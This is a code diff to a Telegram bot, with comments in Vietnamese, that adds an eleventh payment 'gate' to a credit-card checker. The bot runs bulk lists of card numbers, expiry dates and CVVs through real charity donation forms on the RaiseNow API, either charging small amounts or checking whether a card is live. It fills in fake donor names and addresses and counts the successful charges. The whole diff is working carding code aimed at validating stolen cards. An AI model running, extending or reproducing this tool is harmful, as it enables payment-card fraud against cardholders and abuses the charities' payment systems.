@@ -34,7 +34,8 @@ from checkers.gate6_checker import check_card_gate6
 from checkers.gate7_checker import check_card_gate7
 from checkers.gate8_checker import check_card_gate8
 from checkers.gate9_checker import check_card_gate9
-from checkers.gate10_checker import check_card_gate10 # <--- THÊM DÒNG NÀY
+from checkers.gate10_checker import check_card_gate10
+from checkers.gate11_checker import check_card_gate11 # <--- THÊM DÒNG NÀY
 
 
 # --- CONFIGURATION ---
@@ -59,7 +60,8 @@ GATE3_MODE_FILE = "gate3_mode.json" # File for gate 3 mode
 GATE5_MODE_FILE = "gate5_mode.json"
 GATE8_MODE_FILE = "gate8_mode.json" # File for gate 8 mode
 GATE9_MODE_FILE = "gate9_mode.json" # File for gate 9 mode
-GATE10_MODE_FILE = "gate10_mode.json" # <--- THÊM DÒNG NÀY
+GATE10_MODE_FILE = "gate10_mode.json"
+GATE11_MODE_FILE = "gate11_mode.json" # <--- THÊM DÒNG NÀY
 
 # --- DEFAULT LIMITS FOR MEMBERS ---
 DEFAULT_MEMBER_LIMIT = 100 # For /mass
@@ -214,7 +216,7 @@ def set_gate9_mode(mode):
     if mode in ['live', 'charge']:
         save_json_file(GATE9_MODE_FILE, {'mode': mode})
 
-# --- GATE 10 MODE MANAGEMENT (NEW) ---
+# --- GATE 10 MODE MANAGEMENT ---
 def get_gate10_mode():
     """Lấy chế độ hiện tại của Gate 10 (charge hoặc live)."""
     mode_data = load_json_file(GATE10_MODE_FILE, default_data={'mode': 'charge'}) # Mặc định là charge
@@ -224,6 +226,18 @@ def set_gate10_mode(mode):
     """Thiết lập chế độ cho Gate 10."""
     if mode in ['live', 'charge']:
         save_json_file(GATE10_MODE_FILE, {'mode': mode})
+
+# --- GATE 11 MODE MANAGEMENT (NEW) ---
+def get_gate11_mode():
+    """Lấy chế độ hiện tại của Gate 11 (charge hoặc live)."""
+    mode_data = load_json_file(GATE11_MODE_FILE, default_data={'mode': 'charge'}) # Mặc định là charge
+    return mode_data.get('mode', 'charge')
+
+def set_gate11_mode(mode):
+    """Thiết lập chế độ cho Gate 11."""
+    if mode in ['live', 'charge']:
+        save_json_file(GATE11_MODE_FILE, {'mode': mode})
+
 
 def _get_charge_value(gate_id, custom_charge_amount=None):
     """Gets the charge value: priority is custom_amount, then range, finally default."""
@@ -413,6 +427,28 @@ def get_formatted_gate_name(gate_id):
                         return f"Charge {min_val:.2f}$ Month (Gate 10)"
                     else:
                         return f"Charge {min_val:.2f}$-{max_val:.2f}$ Month (Gate 10)"
+                except (ValueError, TypeError):
+                    return default_name
+            return default_name
+            
+    # --- NEW: GATE 11 ---
+    if str(gate_id) == '11':
+        gate11_mode = get_gate11_mode()
+        if gate11_mode == 'live':
+            return "Check Live V11 (Gate 11)"
+        else: # Charge mode
+            default_name = "Charge 0.5$ V11 (Gate 11)"
+            ranges = load_json_file(GATE_RANGES_FILE)
+            gate_range = ranges.get(str(gate_id))
+
+            if gate_range and 'min' in gate_range and 'max' in gate_range:
+                try:
+                    min_val = int(gate_range['min']) / 100
+                    max_val = int(gate_range['max']) / 100
+                    if min_val == max_val:
+                        return f"Charge {min_val:.2f}$ V11 (Gate 11)"
+                    else:
+                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ V11 (Gate 11)"
                 except (ValueError, TypeError):
                     return default_name
             return default_name
@@ -953,8 +989,10 @@ def check_card(line, cancellation_event=None, custom_charge_amount=None):
             return check_card_gate8(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate8_mode, _get_charge_value, custom_charge_amount)
         elif active_gate == '9':
             return check_card_gate9(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate9_mode, _get_charge_value, custom_charge_amount)
-        elif active_gate == '10': # <--- THÊM CASE MỚI CHO GATE 10
+        elif active_gate == '10':
             return check_card_gate10(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate10_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '11': # <--- THÊM CASE MỚI CHO GATE 11
+            return check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate11_mode, _get_charge_value, custom_charge_amount)
         else:
             # Fallback cho các gate vẫn còn trong file chính
             gate_functions = {
@@ -1106,7 +1144,7 @@ async def get_help_text(user: User):
         "**Bot & Check Management:**\n"
         "🔹 `/on`, `/off` - Turn the bot on/off.\n"
         "🔹 `/status` - Check the status of the payment gates.\n"
-        "🔹 `/gate [1-10]` - Change the active check gate.\n"
+        "🔹 `/gate [1-11]` - Change the active check gate.\n"
         "🔹 `/setgate <id> <min> <max>` - Set the charge range for a gate.\n"
         "🔹 `/stop <user_id>` - Stop a user's task.\n"
         "🔹 `/cs<amount> <card>` - Check with a custom charge amount.\n\n"
@@ -1328,6 +1366,8 @@ async def _process_single_check(update, context, line, custom_charge_amount=None
         elif active_gate == '9' and get_gate9_mode() == 'charge':
             is_charge_mode = True
         elif active_gate == '10' and get_gate10_mode() == 'charge':
+            is_charge_mode = True
+        elif active_gate == '11' and get_gate11_mode() == 'charge':
             is_charge_mode = True
 
         if custom_charge_amount is not None: # Admin custom charge is also a charge mode
@@ -1682,15 +1722,16 @@ async def multi_check_command(update, context):
                         f"**Progress:** `{processed_count}/{total_lines}`\n"
                     ]
                     # Check if the gate is a charge gate
-                    is_charge_gate = (active_gate in ['1', '2', '3', '4', '5', '6', '8', '9', '10'] and (
+                    is_charge_gate = (active_gate in ['1', '2', '3', '4', '5', '6', '8', '9', '10', '11'] and (
                         (active_gate == '1' and get_gate1_mode() == 'charge') or
                         (active_gate == '2' and get_gate2_mode() == 'charge') or
                         (active_gate == '3' and get_gate3_mode() == 'charge') or
                         (active_gate == '5' and get_gate5_mode() == 'charge') or
-                        (active_gate == '10' and get_gate10_mode() == 'charge') or
-                        (active_gate in ['4', '6']) or
                         (active_gate == '8' and get_gate8_mode() == 'charge') or
-                        (active_gate == '9' and get_gate9_mode() == 'charge')
+                        (active_gate == '9' and get_gate9_mode() == 'charge') or
+                        (active_gate == '10' and get_gate10_mode() == 'charge') or
+                        (active_gate == '11' and get_gate11_mode() == 'charge') or
+                        (active_gate in ['4', '6'])
                     ))
 
                     if is_charge_gate:
@@ -1750,15 +1791,16 @@ async def multi_check_command(update, context):
         ]
 
         final_counts = []
-        is_charge_gate = (active_gate in ['1', '2', '3', '4', '5', '6', '8', '9', '10'] and (
+        is_charge_gate = (active_gate in ['1', '2', '3', '4', '5', '6', '8', '9', '10', '11'] and (
             (active_gate == '1' and get_gate1_mode() == 'charge') or
             (active_gate == '2' and get_gate2_mode() == 'charge') or
             (active_gate == '3' and get_gate3_mode() == 'charge') or
             (active_gate == '5' and get_gate5_mode() == 'charge') or
-            (active_gate == '10' and get_gate10_mode() == 'charge') or
-            (active_gate in ['4', '6']) or
             (active_gate == '8' and get_gate8_mode() == 'charge') or
-            (active_gate == '9' and get_gate9_mode() == 'charge')
+            (active_gate == '9' and get_gate9_mode() == 'charge') or
+            (active_gate == '10' and get_gate10_mode() == 'charge') or
+            (active_gate == '11' and get_gate11_mode() == 'charge') or
+            (active_gate in ['4', '6'])
         ))
         if is_charge_gate:
             final_counts.append(f"✅ **Charged:** `{counts['success']}`")
@@ -1985,15 +2027,16 @@ async def mass_check_handler(update, context):
                         f"**Progress:** `{processed_count}/{total_lines}`\n"
                     ]
                     # Check if the gate is a charge gate
-                    is_charge_gate = (active_gate in ['1', '2', '3', '4', '5', '6', '8', '9', '10'] and (
+                    is_charge_gate = (active_gate in ['1', '2', '3', '4', '5', '6', '8', '9', '10', '11'] and (
                         (active_gate == '1' and get_gate1_mode() == 'charge') or
                         (active_gate == '2' and get_gate2_mode() == 'charge') or
                         (active_gate == '3' and get_gate3_mode() == 'charge') or
                         (active_gate == '5' and get_gate5_mode() == 'charge') or
-                        (active_gate == '10' and get_gate10_mode() == 'charge') or
-                        (active_gate in ['4', '6']) or
                         (active_gate == '8' and get_gate8_mode() == 'charge') or
-                        (active_gate == '9' and get_gate9_mode() == 'charge')
+                        (active_gate == '9' and get_gate9_mode() == 'charge') or
+                        (active_gate == '10' and get_gate10_mode() == 'charge') or
+                        (active_gate == '11' and get_gate11_mode() == 'charge') or
+                        (active_gate in ['4', '6'])
                     ))
                     if is_charge_gate:
                         status_lines.append(f"✅ **Charged:** `{counts['success']}`")
@@ -2050,15 +2093,16 @@ async def mass_check_handler(update, context):
                 f"**Gate Used:** `{gate_name}`",
                 f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n"
             ]
-            is_charge_gate = (active_gate in ['1', '2', '3', '4', '5', '6', '8', '9', '10'] and (
+            is_charge_gate = (active_gate in ['1', '2', '3', '4', '5', '6', '8', '9', '10', '11'] and (
                 (active_gate == '1' and get_gate1_mode() == 'charge') or
                 (active_gate == '2' and get_gate2_mode() == 'charge') or
                 (active_gate == '3' and get_gate3_mode() == 'charge') or
                 (active_gate == '5' and get_gate5_mode() == 'charge') or
-                (active_gate == '10' and get_gate10_mode() == 'charge') or
-                (active_gate in ['4', '6']) or
                 (active_gate == '8' and get_gate8_mode() == 'charge') or
-                (active_gate == '9' and get_gate9_mode() == 'charge')
+                (active_gate == '9' and get_gate9_mode() == 'charge') or
+                (active_gate == '10' and get_gate10_mode() == 'charge') or
+                (active_gate == '11' and get_gate11_mode() == 'charge') or
+                (active_gate in ['4', '6'])
             ))
             if is_charge_gate:
                 summary_lines.append(f"✅ **Charged:** `{counts['success']}`")
@@ -2199,7 +2243,8 @@ def _perform_gate_check(gate_id: str, card_line: str):
         '7': {'formId': "250802162822879268", 'merchantId': "3000022877"},
         '8': {'formId': "250804202812044270", 'merchantId': "3000022877"},
         '9': {'formId': "250805043713003023", 'merchantId': "3000022877"},
-        '10': {'formId': "250807190400178471", 'merchantId': "3000022877"} # <--- THÊM GATE 10
+        '10': {'formId': "250807190400178471", 'merchantId': "3000022877"},
+        '11': {'formId': "250808040558588645", 'merchantId': "3000022877"} # <--- THÊM GATE 11
     }
     
     config = gate_configs.get(gate_id)
@@ -2275,10 +2320,15 @@ def _perform_gate_check(gate_id: str, card_line: str):
             mode = get_gate9_mode()
             payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
             payment_payload = {"account_uuid": "8376b96a-a35c-4c30-a9ed-cf298f57cdc5", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": 2000, "suggested_amounts": [2000, 5000, 10000], "user_agent": user_agent}}}, "solution": {"uuid": "7edeeaf-3394-45d5-b9e8-04fba87af7f7", "name": "Lippuner Scholarship", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/jgcnt?lng=en", "uuid": "self-service", "version": "2.16.0", "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "de7a9ccb-9e5b-4267-b2dc-5d406ee9a3d0", "return_url": "https://donate.raisenow.io/jgcnt?lng=en&rnw-view=payment_result"}
-        elif gate_id == '10': # <--- THÊM LOGIC STATUS CHO GATE 10
+        elif gate_id == '10':
             mode = get_gate10_mode()
             payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
             payment_payload = {"account_uuid": "377e94dd-0b4d-408e-9e68-5f6f3f1a0454","test_mode": False,"create_supporter": False,"amount": {"currency": "EUR","value": 50},"supporter": {"locale": "en","first_name": random_first_name,"last_name": random_last_name,"email": random_email()},"raisenow_parameters": {"analytics": {"channel": "paylink","preselected_amount": "5000","suggested_amounts": "[5000,8000,10000]","user_agent": user_agent},"solution": {"uuid": "91d8bd88-a1f2-48eb-b089-23d8f08dcfb3","name": "Patenschaft","type": "donate"},"product": {"name": "tamaro","source_url": "https://donate.raisenow.io/hpgqq?lng=en","uuid": "self-service","version": "2.16.0"},"integration": {"donation_receipt_requested": "false","message": generate_random_string(15)}},"custom_parameters": {"campaign_id": "","campaign_subid": "","rnw_recurring_interval_name": "monthly","rnw_recurring_interval_text": "Monthly"},"payment_information": {"brand_code": "eca","cardholder": random_cardholder,"expiry_month": mes,"expiry_year": ano_full,"transaction_id": transaction_id},"profile": "7307173a-2047-42b4-907a-7097ac083e90","return_url": "https://donate.raisenow.io/hpgqq?lng=en&rnw-view=payment_result","subscription": {"custom_parameters": {"campaign_id": "","campaign_subid": "","rnw_recurring_interval_name": "monthly","rnw_recurring_interval_text": "Monthly"},"raisenow_parameters": {"analytics": {"channel": "paylink","preselected_amount": "5000","suggested_amounts": "[5000,8000,10000]","user_agent": user_agent},"solution": {"uuid": "91d8bd88-a1f2-48eb-b089-23d8f08dcfb3","name": "Patenschaft","type": "donate"},"product": {"name": "tamaro","source_url": "https://donate.raisenow.io/hpgqq?lng=en","uuid": "self-service","version": "2.16.0"},"integration": {"donation_receipt_requested": "false","message": generate_random_string(15)}},"recurring_interval": "7 * *","timezone": "Asia/Bangkok"}}
+        elif gate_id == '11': # <--- THÊM LOGIC STATUS CHO GATE 11
+            from checkers.gate11_checker import COUNTRY_CODES
+            mode = get_gate11_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "dc82362f-b3ba-4581-87e8-79f49eda26a9","test_mode": False,"create_supporter": False,"amount": {"currency": "CHF","value": 50},"supporter": {"locale": "en","salutation": "ms","first_name": random_first_name,"last_name": random_last_name,"email": random_email(),"email_permission": False,"raisenow_parameters": {"integration": {"opt_in": {"email": False}}},"street": generate_random_string(28),"postal_code": str(random.randint(10000,99999)),"city": generate_random_string(22),"country": random.choice(COUNTRY_CODES)},"raisenow_parameters": {"analytics": {"channel": "paylink","preselected_amount": "2000","suggested_amounts": "[2000,5000,10000]","user_agent": user_agent},"solution": {"uuid": "c60204c5-2c1b-47a2-ad3a-d852842eae1e","name": "Page don - Site internet","type": "donate"},"product": {"name": "tamaro","source_url": "https://donate.raisenow.io/nptfc?lng=en","uuid": "self-service","version": "2.16.0"},"integration": {"message": generate_random_string(15)}},"custom_parameters": {"campaign_id": "Page donation - Website","campaign_subid": ""},"payment_information": {"brand_code": "eca","cardholder": random_cardholder,"expiry_month": mes,"expiry_year": ano_full,"transaction_id": transaction_id},"profile": "3da0f136-93dd-496d-a1db-688d7708259e","return_url": "https://donate.raisenow.io/nptfc?lng=en&rnw-view=payment_result"}
         
         payment_headers = {"Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent}
         payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, max_retries=2)
@@ -2308,7 +2358,7 @@ async def status_command(update, context):
     
     test_card = "5196032172122570|4|28|766" # A generic test card
 
-    gate_ids = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10'] # <--- THÊM 10 VÀO DANH SÁCH
+    gate_ids = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11'] # <--- THÊM 11 VÀO DANH SÁCH
     
     with ThreadPoolExecutor(max_workers=len(gate_ids)) as executor:
         future_to_gate = {executor.submit(_perform_gate_check, gid, test_card): gid for gid in gate_ids}
@@ -2353,11 +2403,11 @@ async def gate_command(update, context):
     if not context.args:
         current_gate = get_active_gate()
         current_gate_name = get_formatted_gate_name(current_gate)
-        await update.message.reply_text(f"ℹ️ Current active gate: **{current_gate_name}**.\n\nUse `/gate [1-10]` to change.")
+        await update.message.reply_text(f"ℹ️ Current active gate: **{current_gate_name}**.\n\nUse `/gate [1-11]` to change.")
         return
         
     new_gate = context.args[0]
-    # --- UPDATED TO INCLUDE GATE 1, 3, 5, 10 ---
+    # --- UPDATED TO INCLUDE GATE 1, 3, 5, 10, 11 ---
     if new_gate == '1':
         keyboard = [
             [
@@ -2430,7 +2480,7 @@ async def gate_command(update, context):
             "Please select a mode for **Gate 9**:",
             reply_markup=reply_markup
         )
-    elif new_gate == '10': # <--- THÊM LOGIC CHO GATE 10
+    elif new_gate == '10': 
         keyboard = [
             [
                 InlineKeyboardButton("💰 Charge", callback_data="setgate10mode_charge"),
@@ -2442,12 +2492,24 @@ async def gate_command(update, context):
             "Please select a mode for **Gate 10**:",
             reply_markup=reply_markup
         )
+    elif new_gate == '11': # <--- THÊM LOGIC CHO GATE 11
+        keyboard = [
+            [
+                InlineKeyboardButton("💰 Charge V11", callback_data="setgate11mode_charge"),
+                InlineKeyboardButton("⚡ Check Live V11", callback_data="setgate11mode_live"),
+            ]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            "Please select a mode for **Gate 11**:",
+            reply_markup=reply_markup
+        )
     elif new_gate in ['4', '6', '7']: # Gate 4, 6, 7 là các gate cố định
         set_active_gate(new_gate)
         new_gate_name = get_formatted_gate_name(new_gate)
         await update.message.reply_text(f"✅ Switched payment gate to: **{new_gate_name}**")
     else:
-        await update.message.reply_text("❌ Invalid gate. Please choose from `1-10`.")
+        await update.message.reply_text("❌ Invalid gate. Please choose from `1-11`.")
 
 async def set_gate_range_command(update, context):
     """(Admin) Set the charge range for a gate. /setgate <id> <min> <max>"""
@@ -2459,8 +2521,8 @@ async def set_gate_range_command(update, context):
         
     try:
         gate_id, min_str, max_str = context.args
-        if gate_id not in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']: # <--- THÊM 10 VÀO DANH SÁCH
-            await update.message.reply_text("❌ `gate_id` must be from 1 to 10.")
+        if gate_id not in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']: # <--- THÊM 11 VÀO DANH SÁCH
+            await update.message.reply_text("❌ `gate_id` must be from 1 to 11.")
             return
         min_val = int(min_str)
         max_val = int(max_str)
@@ -2713,7 +2775,7 @@ async def button_handler(update, context):
     data = query.data.split('_')
     command = data[0]
     
-    # --- GATE 1, 2, 3, 5, 8, 9 & 10 MODE SELECTION ---
+    # --- GATE 1, 2, 3, 5, 8, 9, 10 & 11 MODE SELECTION ---
     if command == "setgate1mode":
         if user_from_callback.id != ADMIN_ID:
             await query.answer("You don't have permission.", show_alert=True)
@@ -2798,7 +2860,7 @@ async def button_handler(update, context):
         await query.edit_message_text(f"✅ Switched payment gate to: **{new_gate_name}**")
         return
 
-    if command == "setgate10mode": # <--- THÊM LOGIC CHO NÚT BẤM GATE 10
+    if command == "setgate10mode":
         if user_from_callback.id != ADMIN_ID:
             await query.answer("You don't have permission.", show_alert=True)
             return
@@ -2808,6 +2870,20 @@ async def button_handler(update, context):
         set_active_gate('10') # Ensure gate 10 is selected
         
         new_gate_name = get_formatted_gate_name('10')
+        await query.answer(f"Switched to {new_gate_name}")
+        await query.edit_message_text(f"✅ Switched payment gate to: **{new_gate_name}**")
+        return
+        
+    if command == "setgate11mode": # <--- THÊM LOGIC CHO NÚT BẤM GATE 11
+        if user_from_callback.id != ADMIN_ID:
+            await query.answer("You don't have permission.", show_alert=True)
+            return
+        
+        mode = data[1] # 'charge' or 'live'
+        set_gate11_mode(mode)
+        set_active_gate('11') # Ensure gate 11 is selected
+        
+        new_gate_name = get_formatted_gate_name('11')
         await query.answer(f"Switched to {new_gate_name}")
         await query.edit_message_text(f"✅ Switched payment gate to: **{new_gate_name}**")
         return
